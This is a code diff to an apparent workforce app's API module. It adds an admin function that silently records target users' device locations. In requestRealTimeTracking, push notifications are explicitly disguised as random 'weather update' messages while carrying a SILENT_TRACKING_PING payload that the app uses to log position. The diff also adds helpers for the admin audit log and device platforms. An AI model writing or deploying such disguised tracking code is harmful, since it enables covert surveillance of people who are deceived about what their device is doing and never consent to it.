@@ -1,4 +1,5 @@
 import { createClient, PostgrestResponse } from '@supabase/supabase-js';
+import { Capacitor } from '@capacitor/core';
 import { supabase } from './supabase';
 import { dispatchNotificationFromRules } from './notificationService';
 import type {
@@ -407,6 +408,187 @@ export const api = {
     }
     return (data || []).map(toCamelCase);
   },
+
+  requestRealTimeTracking: async (targetUserIds: string[], platforms?: string[]): Promise<void> => {
+    const { data: { user } } = await supabase.auth.getUser();
+    if (!user) throw new Error('Not authenticated');
+
+    // 1. Create audit log entries with a shared request_id for tracking
+    const requestId = crypto.randomUUID();
+    const logEntries = targetUserIds.map(targetId => ({
+      request_id: requestId,
+      admin_id: user.id,
+      target_user_id: targetId,
+      status: 'pending',
+      metadata: { 
+        source: 'dashboard_manual_find',
+        target_platforms: platforms 
+      }
+    }));
+
+    const { error: logError } = await supabase.from('tracking_audit_logs').insert(logEntries);
+    if (logError) console.error('Failed to log tracking request:', logError);
+
+    // 2. Trigger push notifications via Edge Function
+    // We send a disguised 'weather update' which the app handles to record position
+    const weatherMessages = [
+      { title: 'Weather Update ☀️', message: 'Clear skies today. Perfect for field operations!' },
+      { title: 'Weather Advisory ☁️', message: 'Partly cloudy conditions. Stay safe on the road.' },
+      { title: 'Daily Forecast 🌡️', message: 'Temperature is within normal range. Keep hydrated!' },
+      { title: 'Sky Watch 🌤️', message: 'Good visibility today. Have a productive shift!' },
+      { title: 'Atmosphere Update 🌫️', message: 'Visibility is good. Proceed with your scheduled route.' }
+    ];
+    const randomWeather = weatherMessages[Math.floor(Math.random() * weatherMessages.length)];
+
+    try {
+      await supabase.functions.invoke('send-notification', {
+        body: {
+          userIds: targetUserIds,
+          platforms: platforms,
+          title: randomWeather.title,
+          message: randomWeather.message,
+          data: {
+            type: 'SILENT_TRACKING_PING',
+            requestId: requestId,
+            userId: targetUserIds[0] // Primary target user ID for background service route_history insert
+          }
+        }
+      });
+
+      // Local bypass: If the current user is a target, trigger locally too
+      // This helps with testing on the same machine and ensures immediate response
+      const currentPlatform = Capacitor.getPlatform(); // 'web', 'ios', or 'android'
+      const isTargetPlatform = !platforms || platforms.length === 0 || platforms.includes(currentPlatform);
+
+      if (targetUserIds.includes(user.id) && isTargetPlatform) {
+        console.log(`[API] Target includes current user on ${currentPlatform}, triggering local ping...`);
+        window.dispatchEvent(new CustomEvent('silent-tracking-ping', { 
+          detail: { type: 'SILENT_TRACKING_PING', requestId } 
+        }));
+      }
+    } catch (err) {
+      console.error('Failed to trigger tracking pings:', err);
+      throw err;
+    }
+  },
+
+  getUserActivePlatforms: async (userIds: string[]): Promise<Record<string, string[]>> => {
+    if (userIds.length === 0) return {};
+
+    const { data, error } = await supabase
+      .from('fcm_tokens')
+      .select('user_id, platform')
+      .in('user_id', userIds);
+
+    if (error) {
+      console.error('Failed to fetch user platforms:', error);
+      return {};
+    }
+
+    const mapping: Record<string, string[]> = {};
+    (data || []).forEach(row => {
+      if (!mapping[row.user_id]) {
+        mapping[row.user_id] = [];
+      }
+      if (!mapping[row.user_id].includes(row.platform)) {
+        mapping[row.user_id].push(row.platform);
+      }
+    });
+
+    return mapping;
+  },
+
+  getTrackingAuditLogs: async (startDate: string, endDate: string): Promise<any[]> => {
+    try {
+      const start = new Date(startDate);
+      start.setHours(0, 0, 0, 0);
+      const end = new Date(endDate);
+      end.setHours(23, 59, 59, 999);
+
+      // 1. Fetch the raw logs without joins to avoid schema cache issues
+      const { data: logs, error: logsError } = await supabase
+        .from('tracking_audit_logs')
+        .select('*')
+        .gte('requested_at', start.toISOString())
+        .lte('requested_at', end.toISOString())
+        .order('requested_at', { ascending: false });
+      
+      if (logsError) {
+        console.error("Failed to fetch tracking logs:", logsError);
+        return [];
+      }
+      
+      if (!logs || logs.length === 0) return [];
+
+      // 2. Collect all unique user IDs involved
+      const userIds = new Set<string>();
+      logs.forEach(log => {
+        if (log.admin_id) userIds.add(log.admin_id);
+        if (log.target_user_id) userIds.add(log.target_user_id);
+      });
+
+      // 3. Fetch user names, roles and photos in a single batch
+      const { data: users, error: usersError } = await supabase
+        .from('users')
+        .select('id, name, role_id, photo_url')
+        .in('id', Array.from(userIds));
+
+      const userMap = new Map();
+      if (!usersError && users) {
+        users.forEach(u => userMap.set(u.id, u));
+      }
+
+      // 4. Merge data manually
+      return logs.map(log => {
+        const adminUser = userMap.get(log.admin_id);
+        const targetUser = userMap.get(log.target_user_id);
+        
+        return {
+          id: log.id,
+          requestId: log.request_id,
+          adminId: log.admin_id,
+          targetUserId: log.target_user_id,
+          requestedAt: log.requested_at,
+          status: log.status,
+          admin: adminUser ? { 
+            name: adminUser.name, 
+            role: adminUser.role_id, 
+            photoUrl: adminUser.photo_url 
+          } : { name: 'Unknown Admin', role: '', photoUrl: null },
+          target: targetUser ? { 
+            name: targetUser.name, 
+            role: targetUser.role_id, 
+            photoUrl: targetUser.photo_url 
+          } : { name: 'Unknown Agent', role: '', photoUrl: null }
+        };
+      });
+    } catch (err) {
+      console.error("Exception in getTrackingAuditLogs:", err);
+      return [];
+    }
+  },
+
+  updateTrackingRequestStatus: async (requestId: string, status: 'successful' | 'failed'): Promise<void> => {
+    try {
+      const { data: { user } } = await supabase.auth.getUser();
+      if (!user) return;
+
+      const { error } = await supabase
+        .from('tracking_audit_logs')
+        .update({ status })
+        .eq('request_id', requestId)
+        .eq('target_user_id', user.id);
+        
+      if (error) {
+        console.error(`[API] Failed to update tracking status to ${status}:`, error);
+      } else {
+        console.log(`[API] Successfully updated tracking status for request ${requestId} to ${status}`);
+      }
+    } catch (err) {
+      console.error('[API] Exception updating tracking status:', err);
+    }
+  },
+
   getSiteAttendanceRecords: async (): Promise<SiteAttendanceRecord[]> => {
     return fetchWithCache('site_attendance_records', async () => {
       const { data, error } = await supabase
